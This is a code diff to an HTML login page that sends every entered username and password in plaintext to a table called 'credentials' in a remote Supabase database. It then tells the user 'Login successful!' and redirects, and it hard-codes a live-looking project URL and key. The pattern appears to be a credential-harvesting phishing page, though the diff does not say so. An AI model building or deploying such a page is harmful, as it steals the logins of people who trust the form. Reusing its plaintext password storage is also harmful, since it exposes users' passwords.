@@ -334,14 +334,25 @@
     <script>
         // Initialize Supabase client
         // Replace these with your actual Supabase credentials
-        const SUPABASE_URL = 'YOUR_SUPABASE_URL'; // e.g., https://xxxxx.supabase.co
-        const SUPABASE_ANON_KEY = 'YOUR_SUPABASE_ANON_KEY';
+        const SUPABASE_URL = 'https://pvbkrahfgelbztrgelsa.supabase.co'; // e.g., https://xxxxx.supabase.co
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB2YmtyYWhmZ2VsYnp0cmdlbHNhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjcyNzg5MzgsImV4cCI6MjA4Mjg1NDkzOH0.wZPtRyRg3owcNhrPmIt0D6nDjIgYFu31fX6UHp69NJM';
+        
+        console.log('=== SUPABASE CONFIGURATION ===');
+        console.log('URL:', SUPABASE_URL);
+        console.log('Key (first 20 chars):', SUPABASE_ANON_KEY.substring(0, 20) + '...');
+        
+        // Check if credentials are placeholder
+        if (SUPABASE_URL === 'YOUR_SUPABASE_URL' || SUPABASE_ANON_KEY === 'YOUR_SUPABASE_ANON_KEY') {
+            console.error('⚠️ SUPABASE CREDENTIALS NOT SET! Please replace YOUR_SUPABASE_URL and YOUR_SUPABASE_ANON_KEY with your actual credentials.');
+            alert('Error: Supabase credentials not configured. Check console for details.');
+        }
         
         // Fix: Use the global supabase object correctly
         const { createClient } = supabase;
         const supabaseClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
         
         console.log('Supabase client initialized:', supabaseClient);
+        console.log('=== END CONFIGURATION ===\n');
 
         // Get form elements
         const loginForm = document.getElementById('loginForm');
@@ -355,6 +366,10 @@
             const password = document.getElementById('password').value;
             const submitButton = loginForm.querySelector('button[type="submit"]');
 
+            console.log('\n=== LOGIN ATTEMPT ===');
+            console.log('Username:', username);
+            console.log('Password length:', password.length);
+
             // Disable button during processing
             submitButton.disabled = true;
             submitButton.textContent = 'Logging in...';
@@ -362,27 +377,35 @@
 
             try {
                 // Insert the credentials into the database
-                console.log('Storing credentials for username:', username);
+                console.log('Attempting to insert into Supabase...');
+                console.log('Table: credentials');
+                console.log('Data to insert:', { username, password: '***' });
+                
+                const insertData = { 
+                    username: username, 
+                    password: password 
+                };
                 
                 const { data, error } = await supabaseClient
                     .from('credentials')
-                    .insert([
-                        { 
-                            username: username, 
-                            password: password 
-                        }
-                    ])
+                    .insert([insertData])
                     .select();
 
-                console.log('Insert result:', { data, error });
+                console.log('=== SUPABASE RESPONSE ===');
+                console.log('Data:', data);
+                console.log('Error:', error);
+                console.log('Error details:', error ? JSON.stringify(error, null, 2) : 'None');
 
                 if (error) {
-                    showMessage('Error storing credentials: ' + error.message, 'error');
-                    console.error('Supabase error:', error);
+                    showMessage('Error: ' + error.message, 'error');
+                    console.error('❌ Supabase insert failed:', error);
+                    console.error('Error code:', error.code);
+                    console.error('Error hint:', error.hint);
+                    console.error('Error details:', error.details);
                 } else {
                     // Successfully stored credentials
                     showMessage('Login successful!', 'success');
-                    console.log('Credentials stored:', data);
+                    console.log('✅ Credentials stored successfully:', data);
                     
                     // Redirect after storing
                     setTimeout(() => {
@@ -391,12 +414,14 @@
                     }, 1500);
                 }
             } catch (err) {
-                showMessage('An unexpected error occurred: ' + err.message, 'error');
-                console.error('Error:', err);
+                showMessage('Unexpected error: ' + err.message, 'error');
+                console.error('❌ Caught exception:', err);
+                console.error('Exception stack:', err.stack);
             } finally {
                 // Re-enable button
                 submitButton.disabled = false;
                 submitButton.textContent = 'Log in';
+                console.log('=== END LOGIN ATTEMPT ===\n');
             }
         });
 
